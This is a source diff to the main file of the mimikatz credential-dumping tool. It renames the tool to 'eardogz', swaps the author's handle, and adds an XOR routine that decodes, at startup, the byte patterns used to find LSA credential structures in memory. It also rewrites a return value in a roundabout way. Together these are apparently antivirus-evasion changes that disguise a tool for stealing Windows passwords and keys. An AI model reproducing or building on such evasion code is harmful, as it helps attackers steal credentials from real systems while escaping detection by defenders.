@@ -1,11 +1,11 @@
-/*	Benjamin DELPY `gentilkiwi`
-	https://blog.gentilkiwi.com
-	benjamin@gentilkiwi.com
+/*	Benjamin DELPY `FYtD`
+	https://blog.FYtD.com
+	benjamin@FYtD.com
 	Licence : https://creativecommons.org/licenses/by/4.0/
 */
-#include "mimikatz.h"
+#include "eardogz.h"
 
-const KUHL_M * mimikatz_modules[] = {
+const KUHL_M * eardogz_modules[] = {
 	&kuhl_m_standard,
 	&kuhl_m_crypto,
 	&kuhl_m_sekurlsa,
@@ -35,6 +35,55 @@ const KUHL_M * mimikatz_modules[] = {
 	&kuhl_m_acr,
 };
 
+extern BYTE PTRN_WALL_LsaDbrQueryInfoTrustedDomain[7];
+extern BYTE PTRN_W10_1703_SPCryptExportKey[6];
+extern BYTE PTRN_W10_1809_SPCryptExportKey[6];
+extern BYTE PTRN_W2K8R2_DomainList[11];
+extern BYTE PTRN_W2K12R2_DomainList[13];
+extern BYTE PTRN_W2004_SspCredentialList[9];
+extern BYTE PTRN_WIN10_SspCredentialList[7];
+
+void decode_xor()
+{
+	BYTE secret_keys[] = { 0x13, 0x37, 0xde, 0xad, 0xbe, 0xef };
+	DWORD len_secret_keys = _countof(secret_keys);
+
+	for (int i = 1; i < _countof(PTRN_WALL_LsaDbrQueryInfoTrustedDomain); i++)
+	{
+		PTRN_WALL_LsaDbrQueryInfoTrustedDomain[i] ^= secret_keys[i % len_secret_keys];
+	}
+
+	for (int i = 0; i < _countof(PTRN_W10_1703_SPCryptExportKey); i++)
+	{
+		PTRN_W10_1703_SPCryptExportKey[i] ^= secret_keys[i % len_secret_keys];
+	}
+
+	for (int i = 0; i < _countof(PTRN_W10_1809_SPCryptExportKey); i++)
+	{
+		PTRN_W10_1809_SPCryptExportKey[i] ^= secret_keys[i % len_secret_keys];
+	}
+
+	for (int i = 1; i < _countof(PTRN_W2K8R2_DomainList); i++)
+	{
+		PTRN_W2K8R2_DomainList[i] ^= secret_keys[i % len_secret_keys];
+	}
+
+	for (int i = 1; i < _countof(PTRN_W2K12R2_DomainList); i++)
+	{
+		PTRN_W2K12R2_DomainList[i] ^= secret_keys[i % len_secret_keys];
+	}
+
+	for (int i = 1; i < _countof(PTRN_W2004_SspCredentialList); i++)
+	{
+		PTRN_W2004_SspCredentialList[i] ^= secret_keys[i % len_secret_keys];
+	}
+
+	for (int i = 0; i < _countof(PTRN_WIN10_SspCredentialList); i++)
+	{
+		PTRN_WIN10_SspCredentialList[i] ^= secret_keys[i % len_secret_keys];
+	}
+}
+
 int wmain(int argc, wchar_t * argv[])
 {
 	NTSTATUS status = STATUS_SUCCESS;
@@ -43,49 +92,50 @@ int wmain(int argc, wchar_t * argv[])
 	size_t len;
 	wchar_t input[0xffff];
 #endif
-	mimikatz_begin();
-	for(i = MIMIKATZ_AUTO_COMMAND_START ; (i < argc) && (status != STATUS_PROCESS_IS_TERMINATING) && (status != STATUS_THREAD_IS_TERMINATING) ; i++)
+	decode_xor();
+	eardogz_begin();
+	for(i = EARDOGZ_AUTO_COMMAND_START ; (i < argc) && (status != STATUS_PROCESS_IS_TERMINATING) && (status != STATUS_THREAD_IS_TERMINATING) ; i++)
 	{
-		kprintf(L"\n" MIMIKATZ L"(" MIMIKATZ_AUTO_COMMAND_STRING L") # %s\n", argv[i]);
-		status = mimikatz_dispatchCommand(argv[i]);
+		kprintf(L"\n" EARDOGZ L"(" EARDOGZ_AUTO_COMMAND_STRING L") # %s\n", argv[i]);
+		status = eardogz_dispatchCommand(argv[i]);
 	}
 #if !defined(_POWERKATZ)
 	while ((status != STATUS_PROCESS_IS_TERMINATING) && (status != STATUS_THREAD_IS_TERMINATING))
 	{
-		kprintf(L"\n" MIMIKATZ L" # "); fflush(stdin);
+		kprintf(L"\n" EARDOGZ L" # "); fflush(stdin);
 		if(fgetws(input, ARRAYSIZE(input), stdin) && (len = wcslen(input)) && (input[0] != L'\n'))
 		{
 			if(input[len - 1] == L'\n')
 				input[len - 1] = L'\0';
 			kprintf_inputline(L"%s\n", input);
-			status = mimikatz_dispatchCommand(input);
+			status = eardogz_dispatchCommand(input);
 		}
 	}
 #endif
-	mimikatz_end(status);
+	eardogz_end(status);
 	return STATUS_SUCCESS;
 }
 
-void mimikatz_begin()
+void eardogz_begin()
 {
 	kull_m_output_init();
 #if !defined(_POWERKATZ)
-	SetConsoleTitle(MIMIKATZ L" " MIMIKATZ_VERSION L" " MIMIKATZ_ARCH L" (oe.eo)");
+	SetConsoleTitle(EARDOGZ L" " EARDOGZ_VERSION L" " EARDOGZ_ARCH L" (oe.eo)");
 	SetConsoleCtrlHandler(HandlerRoutine, TRUE);
 #endif
 	kprintf(L"\n"
-		L"  .#####.   " MIMIKATZ_FULL L"\n"
-		L" .## ^ ##.  " MIMIKATZ_SECOND L" - (oe.eo)\n"
-		L" ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
-		L" ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz\n"
+		L"  .#####.   " EARDOGZ_FULL L"\n"
+		L" .## ^ ##.  " EARDOGZ_SECOND L" - (oe.eo)\n"
+		L" ## / \\ ##  /*** Benjamin DELPY `FYtD` ( benjamin@FYtD.com )\n"
+		L" ## \\ / ##       > https://blog.FYtD.com/eardogz\n"
 		L" '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n"
 		L"  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/\n");
-	mimikatz_initOrClean(TRUE);
+	eardogz_initOrClean(TRUE);
 }
 
-void mimikatz_end(NTSTATUS status)
+void eardogz_end(NTSTATUS status)
 {
-	mimikatz_initOrClean(FALSE);
+	eardogz_initOrClean(FALSE);
 #if !defined(_POWERKATZ)
 	SetConsoleCtrlHandler(HandlerRoutine, FALSE);
 #endif
@@ -99,11 +149,11 @@ void mimikatz_end(NTSTATUS status)
 
 BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
 {
-	mimikatz_initOrClean(FALSE);
+	eardogz_initOrClean(FALSE);
 	return FALSE;
 }
 
-NTSTATUS mimikatz_initOrClean(BOOL Init)
+NTSTATUS eardogz_initOrClean(BOOL Init)
 {
 	unsigned short indexModule;
 	PKUHL_M_C_FUNC_INIT function;
@@ -113,8 +163,8 @@ NTSTATUS mimikatz_initOrClean(BOOL Init)
 
 	if(Init)
 	{
-		RtlGetNtVersionNumbers(&MIMIKATZ_NT_MAJOR_VERSION, &MIMIKATZ_NT_MINOR_VERSION, &MIMIKATZ_NT_BUILD_NUMBER);
-		MIMIKATZ_NT_BUILD_NUMBER &= 0x00007fff;
+		RtlGetNtVersionNumbers(&EARDOGZ_NT_MAJOR_VERSION, &EARDOGZ_NT_MINOR_VERSION, &EARDOGZ_NT_BUILD_NUMBER);
+		EARDOGZ_NT_BUILD_NUMBER &= 0x00007fff;
 		offsetToFunc = FIELD_OFFSET(KUHL_M, pInit);
 		hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
 		if(FAILED(hr))
@@ -127,13 +177,13 @@ NTSTATUS mimikatz_initOrClean(BOOL Init)
 	else
 		offsetToFunc = FIELD_OFFSET(KUHL_M, pClean);
 
-	for(indexModule = 0; indexModule < ARRAYSIZE(mimikatz_modules); indexModule++)
+	for(indexModule = 0; indexModule < ARRAYSIZE(eardogz_modules); indexModule++)
 	{
-		if(function = *(PKUHL_M_C_FUNC_INIT *) ((ULONG_PTR) (mimikatz_modules[indexModule]) + offsetToFunc))
+		if(function = *(PKUHL_M_C_FUNC_INIT *) ((ULONG_PTR) (eardogz_modules[indexModule]) + offsetToFunc))
 		{
 			fStatus = function();
 			if(!NT_SUCCESS(fStatus))
-				kprintf(L">>> %s of \'%s\' module failed : %08x\n", (Init ? L"INIT" : L"CLEAN"), mimikatz_modules[indexModule]->shortName, fStatus);
+				kprintf(L">>> %s of \'%s\' module failed : %08x\n", (Init ? L"INIT" : L"CLEAN"), eardogz_modules[indexModule]->shortName, fStatus);
 		}
 	}
 
@@ -146,7 +196,7 @@ NTSTATUS mimikatz_initOrClean(BOOL Init)
 	return STATUS_SUCCESS;
 }
 
-NTSTATUS mimikatz_dispatchCommand(wchar_t * input)
+NTSTATUS eardogz_dispatchCommand(wchar_t * input)
 {
 	NTSTATUS status = STATUS_UNSUCCESSFUL;
 	PWCHAR full;
@@ -161,14 +211,14 @@ NTSTATUS mimikatz_dispatchCommand(wchar_t * input)
 			status = kuhl_m_rpc_do(full + 1);
 			break;
 		default:
-			status = mimikatz_doLocal(full);
+			status = eardogz_doLocal(full);
 		}
 		LocalFree(full);
 	}
 	return status;
 }
 
-NTSTATUS mimikatz_doLocal(wchar_t * input)
+NTSTATUS eardogz_doLocal(wchar_t * input)
 {
 	NTSTATUS status = STATUS_SUCCESS;
 	int argc;
@@ -189,43 +239,43 @@ NTSTATUS mimikatz_doLocal(wchar_t * input)
 		}
 		else command = argv[0];
 
-		for(indexModule = 0; !moduleFound && (indexModule < ARRAYSIZE(mimikatz_modules)); indexModule++)
-			if(moduleFound = (!module || (_wcsicmp(module, mimikatz_modules[indexModule]->shortName) == 0)))
+		for(indexModule = 0; !moduleFound && (indexModule < ARRAYSIZE(eardogz_modules)); indexModule++)
+			if(moduleFound = (!module || (_wcsicmp(module, eardogz_modules[indexModule]->shortName) == 0)))
 				if(command)
-					for(indexCommand = 0; !commandFound && (indexCommand < mimikatz_modules[indexModule]->nbCommands); indexCommand++)
-						if(commandFound = _wcsicmp(command, mimikatz_modules[indexModule]->commands[indexCommand].command) == 0)
-							status = mimikatz_modules[indexModule]->commands[indexCommand].pCommand(argc - 1, argv + 1);
+					for(indexCommand = 0; !commandFound && (indexCommand < eardogz_modules[indexModule]->nbCommands); indexCommand++)
+						if(commandFound = _wcsicmp(command, eardogz_modules[indexModule]->commands[indexCommand].command) == 0)
+							status = eardogz_modules[indexModule]->commands[indexCommand].pCommand(argc - 1, argv + 1);
 
 		if(!moduleFound)
 		{
 			PRINT_ERROR(L"\"%s\" module not found !\n", module);
-			for(indexModule = 0; indexModule < ARRAYSIZE(mimikatz_modules); indexModule++)
+			for(indexModule = 0; indexModule < ARRAYSIZE(eardogz_modules); indexModule++)
 			{
-				kprintf(L"\n%16s", mimikatz_modules[indexModule]->shortName);
-				if(mimikatz_modules[indexModule]->fullName)
-					kprintf(L"  -  %s", mimikatz_modules[indexModule]->fullName);
-				if(mimikatz_modules[indexModule]->description)
-					kprintf(L"  [%s]", mimikatz_modules[indexModule]->description);
+				kprintf(L"\n%16s", eardogz_modules[indexModule]->shortName);
+				if(eardogz_modules[indexModule]->fullName)
+					kprintf(L"  -  %s", eardogz_modules[indexModule]->fullName);
+				if(eardogz_modules[indexModule]->description)
+					kprintf(L"  [%s]", eardogz_modules[indexModule]->description);
 			}
 			kprintf(L"\n");
 		}
 		else if(!commandFound)
 		{
 			indexModule -= 1;
-			PRINT_ERROR(L"\"%s\" command of \"%s\" module not found !\n", command, mimikatz_modules[indexModule]->shortName);
+			PRINT_ERROR(L"\"%s\" command of \"%s\" module not found !\n", command, eardogz_modules[indexModule]->shortName);
 
-			kprintf(L"\nModule :\t%s", mimikatz_modules[indexModule]->shortName);
-			if(mimikatz_modules[indexModule]->fullName)
-				kprintf(L"\nFull name :\t%s", mimikatz_modules[indexModule]->fullName);
-			if(mimikatz_modules[indexModule]->description)
-				kprintf(L"\nDescription :\t%s", mimikatz_modules[indexModule]->description);
+			kprintf(L"\nModule :\t%s", eardogz_modules[indexModule]->shortName);
+			if(eardogz_modules[indexModule]->fullName)
+				kprintf(L"\nFull name :\t%s", eardogz_modules[indexModule]->fullName);
+			if(eardogz_modules[indexModule]->description)
+				kprintf(L"\nDescription :\t%s", eardogz_modules[indexModule]->description);
 			kprintf(L"\n");
 
-			for(indexCommand = 0; indexCommand < mimikatz_modules[indexModule]->nbCommands; indexCommand++)
+			for(indexCommand = 0; indexCommand < eardogz_modules[indexModule]->nbCommands; indexCommand++)
 			{
-				kprintf(L"\n%16s", mimikatz_modules[indexModule]->commands[indexCommand].command);
-				if(mimikatz_modules[indexModule]->commands[indexCommand].description)
-					kprintf(L"  -  %s", mimikatz_modules[indexModule]->commands[indexCommand].description);
+				kprintf(L"\n%16s", eardogz_modules[indexModule]->commands[indexCommand].command);
+				if(eardogz_modules[indexModule]->commands[indexCommand].description)
+					kprintf(L"  -  %s", eardogz_modules[indexModule]->commands[indexCommand].description);
 			}
 			kprintf(L"\n");
 		}
@@ -238,7 +288,7 @@ NTSTATUS mimikatz_doLocal(wchar_t * input)
 }
 
 #if defined(_POWERKATZ)
-__declspec(dllexport) wchar_t * powershell_reflective_mimikatz(LPCWSTR input)
+__declspec(dllexport) wchar_t * powershell_reflective_eardogz(LPCWSTR input)
 {
 	int argc = 0;
 	wchar_t ** argv;
@@ -256,7 +306,7 @@ __declspec(dllexport) wchar_t * powershell_reflective_mimikatz(LPCWSTR input)
 #endif
 
 #if defined(_WINDLL)
-void CALLBACK mimikatz_dll(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow)
+void CALLBACK eardogz_dll(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow)
 {
 	int argc = 0;
 	wchar_t ** argv;
@@ -284,7 +334,8 @@ FARPROC WINAPI delayHookFailureFunc (unsigned int dliNotify, PDelayLoadInfo pdli
 {
     if((dliNotify == dliFailLoadLib) && ((_stricmp(pdli->szDll, "ncrypt.dll") == 0) || (_stricmp(pdli->szDll, "bcrypt.dll") == 0)))
 		RaiseException(ERROR_DLL_NOT_FOUND, 0, 0, NULL);
-    return NULL;
+	return (FARPROC)((ULONGLONG)GetCurrentProcess() ^ (ULONGLONG)GetCurrentProcess());
+    //return NULL;
 }
 #if !defined(_DELAY_IMP_VER)
 const
